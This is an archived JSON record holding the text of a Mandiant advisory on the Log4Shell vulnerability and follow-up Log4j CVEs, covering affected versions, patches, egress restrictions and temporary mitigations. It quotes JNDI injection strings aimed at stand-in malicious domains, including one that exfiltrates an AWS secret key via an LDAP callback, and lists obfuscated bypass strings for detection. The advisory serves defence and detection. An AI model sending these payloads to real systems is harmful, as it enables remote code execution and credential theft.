{
    "id": "7379b5d2-6cb8-4937-b542-331f1ebc7542",
    "created_at": "2023-01-12T15:00:06.234596Z",
    "updated_at": "2025-03-27T02:05:47.8183Z",
    "deleted_at": null,
    "sha1_hash": "c1f893cb48f7d9c2e4f747d3018a04e48ac973aa",
    "title": "2021-12-15 - Log4Shell Initial Exploitation and Mitigation Recommendations",
    "authors": "",
    "file_creation_date": "2022-05-28T15:51:10Z",
    "file_modification_date": "2022-05-28T15:51:10Z",
    "file_size": 157652,
    "plain_text": "# Log4Shell Initial Exploitation and Mitigation Recommendations\n\n**mandiant.com/resources/log4shell-recommendations**\n\nMatthew McWhirt, John Hultquist\n\nDec 15, 2021\n\n14 mins read\n\nThreat Research\n\nVulnerabilities\n\nRemediation\n\n_[UPDATE (Dec. 30): This post has been updated to reflect a new CVE (CVE-2021-44832)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832)_\n_and associated patches._\n\n\n-----\n\n_UPDATE (Dec. 28): This post has been updated to reflect new patches for legacy Java 7_\n_[(2.12.3) and Java 6 clients (2.3.1).](https://logging.apache.org/log4j/log4j-2.12.3/)_\n\n_[UPDATE (Dec. 20): This post has been updated to reflect a new CVE (CVE-2021-45105)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)_\n_[and associated patch (Log4j 2.17.0 for Java 8 clients).](https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0)_\n\n_UPDATE (Dec. 17): This post has been updated to reference CISA’s_ _Emergency Directive_\n_22-02._\n\n_UPDATE (Dec. 16): This post has been updated to reference Apache’s release of Log4j_\n_version 2.12.2 (Java 7 clients)._\n\nThe recently disclosed Log4j vulnerability (CVE-2021-44228) is one of the most pervasive\nsecurity vulnerabilities that organizations have had to deal with over the past decade. Log4j\nis ubiquitous and used by applications and systems deployed across organizations of all\nsizes. Organizations are struggling to assess the scope and impact of the exposure, given it\nis not obvious which applications and systems even use Log4j. Software vendors are actively\ndetermining whether their software uses Log4j and are communicating the impact to their\ncustomers. Organizations must actively monitor for security patch availability and apply it as\nquickly as possible. They must deploy mitigations to reduce the exploitability and impact of\nthe vulnerable systems that they cannot patch or don’t yet know about. Unfortunately, fastmoving adversaries will have the advantage in this scenario, and many are already carrying\nout large-scale efforts to gain footholds in vulnerable target networks.\n\nIn the wake of the vulnerability disclosure, financially motivated actors involved in\ncryptocurrency mining were among the first to exploit targets en masse. We anticipate that\nadditional financially motivated actors will increasingly exploit the vulnerability in operations,\nleading to various monetization activities. This includes data theft, ransomware deployment,\nand multifaceted extortion, as these actors are known to incorporate zero-day and one-day\nexploits into their operations rapidly.\n\nDue to the urgency of identifying and patching vulnerable applications and systems related to\nthis vulnerability, on December 17, 2021, the Cybersecurity and Infrastructure Security\nAgency (CISA) instituted [Emergency Directive 22-02, which requires that civilian federal](https://www.cisa.gov/emergency-directive-22-02)\nagencies must identify and mitigate impacted assets by December 23, 2021, or remove them\nfrom agency networks.\n\nAs of the publish date of this blog post, we have uncovered evidence of exploitation by China\nand Iranian state actors. Microsoft has observed exploitation by threat actors based in other\ncountries. We expect threat actors from additional countries will exploit it shortly, if they\nhaven’t already. In some cases, state sponsored threat actors will work from a list of\nprioritized targets that existed long before this vulnerability was known. In other cases, they\nmay conduct broad exploitation and then conduct further post-exploitation activities of targets\nas they are tasked to do so.\n\n\n-----\n\nThis blog post provides an overview of how this vulnerability impacts organizations, shares\nadditional context on how attackers have leveraged it in the wild, and provides mitigation\nrecommendations.\n\nWe anticipate this problem will have a very long tail, as adversaries exploit their footholds to\ncarry out major compromises in the coming months.\n\n## Background\n\n[Log4j 2 is an open source Java logging library developed by the Apache Foundation. It is](https://logging.apache.org/log4j/2.x/)\nwidely used in many applications and integrated as a dependency in many services. On\nDecember 9, 2021, a critical severity unauthenticated remote code execution vulnerability\n[(CVE-2021-44228 aka “Log4Shell”) impacting multiple versions of the Apache Log4j 2 utility](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)\nwas publicly disclosed. Proof of concept (POC) exploitation tools were immediately available,\nproviding remote code execution capabilities within the context of the user running an\napplication that utilizes the library.\n\nFrom the CVE-2021-44228 description: “Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0\nthrough 2.15.0 JNDI features used in configuration, log messages, and parameters do not\nprotect against attacker-controlled LDAP and other [Java Naming and Directory Interface]\nJNDI related endpoints. An attacker who can control log messages or log message\nparameters can execute arbitrary code loaded from LDAP servers when message lookup\nsubstitution is enabled.”\n\nThe JNDI injection can leverage specific protocols to request a malicious payload from an\nattacker’s infrastructure - including:\n\nLightweight Directory Access Protocol (LDAP)\nSecure LDAP (LDAPS)\nRemote Method Invocation (RMI)\nDomain Name Service (DNS)\n\nAs an example, to exploit the vulnerability, an attacker could construct a JDNI insertion and\ninclude it within the User-Agent HTTP Header - targeting an application or web server that\nleverages a vulnerable version of Log4j 2 to download a malicious class file or payload.\n\n```\nUser-Agent: ${jndi:ldap://<host>:<port>/<path>}\n\n```\n\n[On December 14, 2021, an additional Log4j vulnerability was identified (CVE-2021-45046),](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046)\nbased upon the fact that Log4j version 2.15.0 did not fully mitigate the CVE-2021-44228\nvulnerability with certain non-default configurations, potentially resulting in either remote\n[code execution or a denial of service attack. This was mitigated as of Log4j version 2.16.0](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0)\nfor Java 8 clients.\n\n\n-----\n\nOn December 18, 2021, another Log4j denial of service condition was identified (CVE-202145105) impacting versions 2.0-alpha1 through 2.16.0. This was mitigated as of Log4j version\n[2.12.3 for Java 7 clients and version 2.17.0 for Java 8 clients.](https://logging.apache.org/log4j/log4j-2.12.3/)\n\n[On December 22, 2021, Apache released Log4j version 2.3.1 for legacy Java 6 clients,](https://logging.apache.org/log4j/log4j-2.3.1/)\nwhich provides mitigations for CVE-2021-45105, CVE-2021-45046 and CVE-2021-44228.\n\n[On December 28, 2021, Apache released Log4j versions 2.3.2 (Java 6 clients),](https://logging.apache.org/log4j/log4j-2.3.2/) [2.12.4 (Java](https://logging.apache.org/log4j/log4j-2.12.4/)\n7 clients), and [2.17.1 (Java 8 clients), which provides mitigations for CVE-2021-44832. While](https://logging.apache.org/log4j/log4j-2.17.1)\ncategorized as a remote code execution attack, this vulnerability actually requires that an\nattacker have must have previously established administrative permissions on a target\nendpoint, resulting into the ability to modify the log4j.xml file. With this level of access, an\nattacker could alter the log file to include a malicious configuration via a JDBC Appender,\nwith a data source referencing an attacker-controlled JNDI URI (resulting in remote code\nexecution).\n\n### CVEs and Impacted Log4j Versions\n\nTable 1: Log4J 2021 CVEs\n\n**CVE** **Impacted Versions** **Impact** **Mitigated Version**\n\n\nCVE[2021-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)\n44228\n\nCVE[2021-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046)\n45046\n\n\nLog4j 2.0-beta9 through 2.3\n\nLog4j 2.4 through 2.12.1\n\nLog4j 2.13.0 through 2.15.0\n\nLog4j 2.0-beta9 through 2.3\n\nLog4j 2.4 through 2.12.1\n\nLog4j 2.13.0 through 2.15.0\n\nWhen specifically using a non-default\nPatternLayout with a Context Lookup.\n\n\nRemote\nCode\nExecution\n(RCE)\n\nRemote\nCode\nExecution\n(RCE)\n\nDenial of\nService\n(DoS)\n\n\nLog4j 2.3.1 (Java 6)\n\nLog4j 2.12.2+ (Java\n7)\n\nLog4j 2.16.0+ (Java\n8)\n\nLog4j 2.3.1 (Java 6)\n\nLog4j 2.12.2+ (Java\n7)\n\nLog4j 2.16.0+ (Java\n8)\n\n\n-----\n\n**CVE** **Impacted Versions** **Impact** **Mitigated Version**\n\n\nCVE[2021-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)\n45105\n\nCVE[2021-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4104)\n4104\n\nCVE[2021-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832)\n44832\n\n\nLog4j 2.0-alpha1 through 2.3\n\nLog4j 2.4 through 2.12.1\n\nLog4j 2.13.0 through 2.16.0\n\nWhen specifically using a non-default\nPatternLayout with a Context Lookup.\n\nLog4j 1.2\n\nWhen specifically configured to use\nJMSAppender, Log4j 1.2 is vulnerable to\ndeserialization of untrusted data when the\nattacker has write access to the Log4j\nconfiguration.\n\nThis is not the default configuration.\n\nLog4j 2.0-alpha1 through 2.3.1\n\nLog4j 2.4 through 2.12.3\n\nLog4j 2.13.0 through 2.17.0\n\nRequires that an attacker have elevated\npermissions on a target endpoint which\nprovides the ability to modify the log4j.xml\nfile.\n\nAlso requires that the JDBC Appender\nfunction is being leveraged as part of Log4j.\n\n\nDenial of\nService\n(DoS)\n\nRemote\nCode\nExecution\n(RCE)\n\nRemote\nCode\nExecution\n(RCE)\n\n\nLog4j 2.3.1 (Java 6)\nLog4j 2.12.3 (Java 7)\n\nLog4j 2.17.0 (Java 8)\n\nLog4j 1.x is end of\nlife (as of 2015) and\ncontains additional\nhigh severity security\nvulnerabilities.\n\nUpgrade to a current\nversion of Log4j 2\n\nLog4j 2.3.2 (Java 6)\n\nLog4j 2.12.4 (Java 7)\n\nLog4j 2.17.1 (Java 8)\n\n\n## Mitigation Section\n\n### Assess the Scope\n\n**Identify**\n\nThe first step an organization must consider is to determine the scope of applications and\ndependent services (organization managed and third-party integrated technologies) that\nleverage the Log4j library. This can be a very challenging and time-consuming process, as\nthe Log4j library could be integrated with many third-party vendor applications and products,\nin addition to being installed locally on servers and endpoints within an environment.\n\n\n-----\n\nExample methods which can be potentially leveraged to identify the presence of Log4j:\n\nVerifying with vendors if the products that are leveraged by the organization are\nimpacted.\n\nIf third-party applications are impacted, understanding the vendor recommended\nshort-term mitigation measures, in addition to the timeframe for when a patch or\nupdate path will be available.\nLeveraging internal and external vulnerability scanning tools (ex: Mandiant Attack\nSurface Management (fka Intrigue), Tenable, Rapid7, Qualys, WhiteSource) which\ncontain signatures or plugins for identifying vulnerable Log4j instances. Additionally,\nopen source vulnerability toolsets can also be leveraged to identify vulnerable Log4j\ninstances, including:\n\n[Nuclei](https://github.com/projectdiscovery/nuclei)\n[log4j-finder](https://github.com/fox-it/log4j-finder)\n[log4j-scan](https://github.com/fullhunt/log4j-scan)\n\nScanning should not only be focused for on-premises (external-facing and internal)\nresources – but also cloud assets and applications that are managed by the organization.\n\nReviewing software asset inventory systems to determine if Java Virtual Machine\n(JVM) or Log4j libraries are present. Additionally, software asset inventory systems can\nbe leveraged to verify the presence of applications that correlate to vendor notifications\nof impacted products that rely upon Log4j.\nLeveraging EDR tools to scan for JAR files (ex: log4j-core-2.x.jar), class files (ex:\nJndiLookup.class), or process execution events associated with Log4j.\nLeveraging tools that can generate a software bill of materials (SBOM) for filesystems\n[and containers (e.g. syft).](https://github.com/anchore/syft)\n\nReviewing SIEM logs, endpoint logs, or network traffic to identify matching patterns of\npotential exploitation attempts and [correlating any observed instances to specific endpoints](https://www.splunk.com/en_us/blog/security/log-jammin-log4j-2-rce.html)\nor applications for further review.\n\n**Contain**\n\nOnce the scope is identified, the following high-level containment steps should be followed:\n\nRestrict egress capabilities from applications and servers. This step will essentially\nprevent the Java service from having the ability to download a malicious class file via\nLDAP, LDAPS, RMI, or DNS (or potentially other methods), reducing the impact of\nidentified vulnerability exploitation methods.\nReduce the attack surface of impacted applications and servers by enclaving or limiting\naccess to the application interfaces that could be leveraged for exploitation targeting.\n\n\n-----\n\nNote: Until all third-party integrated technologies have been confirmed patched by vendors,\nthese are important initial steps to take to reduce the risk of CVE-2021-44228 exploitation.\n\nDetermine if the identified applications and services can have Log4j patched to version\n2.3.1 (Java 6), 2.12.2 or higher (Java 7) or 2.17.0 (Java 8).\n\nFor third-party integrated technologies, engage with the application / technology\nvendors to verify if the platform is impacted—and when security updates will be\navailable.\nOnce security updates are available, test and install the updates – prioritizing\ntechnologies and applications that are external facing (or have a broad access\nrequirement within the organization).\nIf patching is not a viable option, consider the implementation of temporary mitigation\nmeasures.\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) has collected a list of ‘affected’\nand ‘not affected’ third-party vendors vulnerable to the Log4j vulnerability. This list can be\n[found on their GitHub.](https://github.com/cisagov/log4j-affected-db)\n\n## Patches\n\n**Log4j versions 2.3.1 (Java 6 clients), 2.12.3 (Java 7 clients) and 2.17.0 (Java 8**\n**clients) include vulnerability mitigations for CVE-2021-44228, CVE-2021-45046, and**\n**CVE-2021-45105. These are the upgrades that Apache recommends for installation.**\n\n### Java 8 Clients\n\n[On December 10, 2021, Apache reported that the CVE-2021-44228 vulnerability had been](https://logging.apache.org/log4j/2.x/security.html)\n[resolved within Log4j 2 version 2.15.0. The 2.15.0 update essentially disabled the message](https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0)\nlookup substitution (log4j2.formatMsgNoLookups) functionality – although JNDI was still\n**enabled by default (allowing LDAP lookups to the localhost).**\n\n[On December 13, 2021, Apache released Log 4j version 2.16.0 for Java 8 clients based](https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0)\nupon the fact that Log4j version 2.15.0 did not fully mitigate the CVE-2021-44228\nvulnerability with certain non-default configurations, potentially resulting in either remote\n[code execution (RCE) or a denial of service attack. (CVE-2021-45046). Of note, this update](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046)\ndisables JNDI functionality and message lookup patterns by default.\n\n[As of December 18, 2021, Apache released Log4j version 2.17.0 for Java 8 clients. This](https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0)\nupdate resolved an issue with specific non-default configurations that could result in a denial\n[of service attack (CVE-2021-45105).](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)\n\n### Java 7 Clients\n\n\n-----\n\n[On December 14, 2021, Apache released Log 4j version 2.12.2 for legacy Java 7 clients,](https://logging.apache.org/log4j/log4j-2.12.2/)\naddressing mitigations for both CVE-2021-44228 and CVE-2021-45046. On December 22,\n[2021, Apache released an additional update for Java 7 clients (Log4j version 2.12.3), which](https://logging.apache.org/log4j/log4j-2.12.3/)\naddresses CVE-2021-45105 by requiring components that use JNDI to be enabled\nindividually using system properties.\n\nNote: Updating to Log4j >= 2.15.0 requires a dependency for Java 8 (or greater). If Java 7 is\nstill required, an upgrade to Log4j 2.12.2 should be considered.\n\nNote: If upgrading from Log4j1.x to Log4j2, the API for Log4j 2 is not compatible with Log4j\n1.x.\n\n### Java 6 Clients\n\nOn December 22, 2021, Apache released Log4j version 2.3.1 for legacy Java 6 clients,\nwhich provides mitigations for CVE-2021-45105, CVE-2021-45046 and CVE-2021-44228.\n\n### Outbound Traffic Restrictions\n\n**Egress Traffic**\n\nFor any application or web application servers that are running impacted version of Log4j\ninstances, egress restrictions should be enforced so that servers cannot openly\ncommunicate and attempt to load arbitrary malicious files from external sites and addresses.\nThe concept of “deny by default” should apply to servers, with only allow-listed and\nauthorized egress traffic flows explicitly defined and enforced.\n\nEgress traffic restrictions should not just be limited to outbound LDAP, LDAPs, RMI, or DNS\nprotocols, but traffic involving any external ports / protocols from servers (as specific ports\ncould be specified within the initial Stage 1 exploit request or leveraged for command and\ncontrol for Stage 2 callbacks).\n\nNote: “Deny by default” egress traffic restrictions are a best practice to follow for any servers,\nnot just those running impacted versions of Log4j instances.\n\n**DNS Queries**\n\nDNS queries from impacted application or web application servers should also be monitored,\nas vulnerable Log4j instances could result in external DNS queries (lookups) being executed,\nresulting in potential information leakage.\n\n```\n${jndi:dns://<malicious domain>/<TXT query string>}\n\n```\n```\n${jdni:ldap://${env:SPECIFIC_VAR}.<malicious domain>/a}\n\n```\n\n-----\n\nWhile DNS may not provide a method to remotely execute arbitrary code on an impacted\nserver, the simple resolution of an attacker’s namespace could potentially be leveraged to\nobtain contextual information, obtain credentials (stored within environment variables), or\ntunnel data through DNS (bypassing other security controls and egress restrictions).\n\nProtecting against this method of reconnaissance and leakage can be extremely difficult, as\nessentially an impacted server would need to have restrictions enforced where DNS\nrecursion is not permissible (and only internal or trusted fully qualified domain names\n(FQDNs) and hosts can be resolved). Considering that many endpoints (including some\nservers) would need the ability to resolve external FQDNs, enforcing this level of hardening\nat scale can be quite challenging and impractical.\n\nA consideration to mitigate this method of information extraction would be to configure\nservers to reference dedicated internal DNS servers for internal name resolution that are not\nconfigured to allow DNS recursion (and only allow name resolution for internal / trusted\nFQDNs).\n\n## Temporary Recommended Mitigations\n\nIf upgrading Log4j 2 to versions 2.3.1 (Java 6), 2.12.2 (Java 7) or 2.17.0 (Java 8) are not\nviable options, Apache has endorsed specific short-term mitigations (although updating to\nthe highest supported version is the recommended approach).\n\n### CVE-2021-44228 and CVE-2021-45046\n\nPer [the Apache post, remove the JndiLookup class from the from the log4j-core jar file.](https://logging.apache.org/log4j/2.x/security.html)\n```\n zip -q -d log4j-core-*.jar\n org/apache/logging/log4j/core/lookup/JndiLookup.class\n\n```\nNote: Previous mitigations including configuring the system property\n(log4j2.formatMsgNoLookups) or environment variables\n(LOG4J_FORMAT_MSG_NO_LOOKUPS or -Dlog4j2.formatMsgNoLookups) to true, or\nmodifying the logging configuration to disable message lookups are no longer\n**recommended, as they have proven to be insufficient since there could be code paths in**\nLog4j where message lookups may still occur.\n\n### CVE-2021-45105\n\nWithin the PatternLayout of the logging configuration, replace Context Lookups similar to\n${ctx:loginId} or $${ctx:loginId} with Thread Context Map patterns (%X, %mdc, or %MDC).\nOtherwise, in the configuration, remove external source application references of Context\nLookups similar to ${ctx:loginId} or $${ctx:loginId}.\n\n\n-----\n\nNote: Environments that are running Log4j version 2.16.0 and are not using Context\nLookups in the PatternLayout configuration (a non-default configuration) are not vulnerable\nto CVE-2021-45105.\n\n### CVE-2021-4104 (Log4J Version 1.2)\n\nPer [CVE-2021-4104, organizations should upgrade to a current version of Log4j 2. Log4j 1.x](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4104)\n[is end of life (as of 2015) and contains additional security vulnerabilities.](https://logging.apache.org/log4j/1.2/)\n\nPer [RedHat guidance, if an upgrade to a current version of Log4 2.x is not possible, these](https://access.redhat.com/security/vulnerabilities/RHSB-2021-009)\nvulnerabilities can be mitigated by removing the JMSAppender class file from the classpath.\n\n```\nzip -q -d log4j-*.jar org/apache/log4j/net/JMSAppender.class\n\n```\n\n**Important: For any of the temporary mitigations noted above, a restart of the**\n**application service and Java Virtual Machine (JVM) instance will be required.**\n\n### CVE-2021-44832\n\n[While temporary mitigations are not referenced by Apache for CVE-2021-44832, remote](https://logging.apache.org/log4j/2.x/security.html)\ncode execution for this vulnerability requires that the JDBC Appender functionality is being\nleveraged as part of Log4j and that an attacker has previously established administrative\npermissions on a target endpoint, resulting into the ability to modify the log4j.xml file.\n\nTo mitigate this specific vulnerability, Apache recommends upgrading to either Log4j version\n[2.3.2 (Java 6 clients),](https://logging.apache.org/log4j/log4j-2.3.2/) [2.12.4 (Java 7 clients), or](https://logging.apache.org/log4j/log4j-2.12.4/) [2.17.1 (Java 8 clients).](https://logging.apache.org/log4j/log4j-2.17.1)\n\n### Inbound URL Request Logging and Filtering\n\n[Many web application firewall and SIEM vendors have now integrated specific signatures](https://gist.github.com/fox-srt/6b3735cf0f0855fcaf7a74f146025c5a#file-log4shell-exploitation-attempts-rules)\nwithin their platforms that can assist with detecting Log4j exploitation activity. Unfortunately\nthere are also many evasion tactics that attackers are leveraging when exploiting vulnerable\nLog4j instances.\n\nIf web application firewalls, reverse proxy servers, or intrusion prevention systems are\npositioned to inspect inbound web traffic URLs and strings, specific patterns can be\nindicative of scanning / exploitation, and could potentially be blocked if devices are\npositioned inline.\n\n[Note: Due to the large number of evolving evasion tactics being observed, this is not to be](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)\nconsidered as a comprehensive listing of potential detection strings relevant to CVE-202146288 activity – but reflective of various patterns that could be leveraged for detection.\n\n\n-----\n\n```\n${jndi:\n\n```\n```\n${::-j}${::-n}${::-d}${::-i}:\n\n```\n```\n${::-l}${::-d}${::-a}${::-p}:\n\n```\n```\n${${::-j}\n\n```\n```\n${::-j}ndi\n\n```\n```\n${::\n```\n```\n${${:-l}${:-o}${:-w}${:-e}${:-r}\n\n```\n```\n${:\n```\n```\n${lower:jndi}\n\n```\n```\n${lower:j}$\n\n```\n```\n${lower:\n\n```\n```\n${upper:\n\n```\n```\n${env:\n\n```\n```\n${sys:\n\n```\n\n## Tactical Remediation\n\nIf a compromised Log4j instance is identified, not only should a forensic investigation be\nconducted, but remediation (removal) of any potentially malicious artifacts (coin miners) or\nbackdoors (web shells).\n\nAn additional tactic that attackers are leveraging is attempting to obtain environmental\nvariables stored on servers using LDAP or DNS callbacks.\n\n```\n${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.<malicious domain>/a}\n\n```\n\nEnvironment variables that contain credentials or keys can be leveraged by an attacker to\nobtain access to additional infrastructure (on-premises or cloud-based). If a compromised\nLog4j instance is running on a server where credentials are stored within environment\nvariables, an important remediation step is to rotate and change the passwords / keys that\ncould have been exposed or accessed.\n\nThis guide contains example environment variables that can be configured for Amazon Web\nServices (AWS).\n\n\n-----\n\n## Conclusion\n\nMandiant will continue to provide updates and relevant mitigations related to this\nvulnerability. Additional information and context can be accessed by registering for a free\n[subscription to Mandiant Advantage Threat Intelligence.](https://login.mandiant.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-15 - Log4Shell Initial Exploitation and Mitigation Recommendations.pdf"
    ],
    "report_names": [
        "2021-12-15 - Log4Shell Initial Exploitation and Mitigation Recommendations.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535606,
    "ts_updated_at": 1743041147,
    "ts_creation_date": 1653753070,
    "ts_modification_date": 1653753070,
    "files": {
        "pdf": "https://archive.orkl.eu/c1f893cb48f7d9c2e4f747d3018a04e48ac973aa.pdf",
        "text": "https://archive.orkl.eu/c1f893cb48f7d9c2e4f747d3018a04e48ac973aa.txt",
        "img": "https://archive.orkl.eu/c1f893cb48f7d9c2e4f747d3018a04e48ac973aa.jpg"
    }
}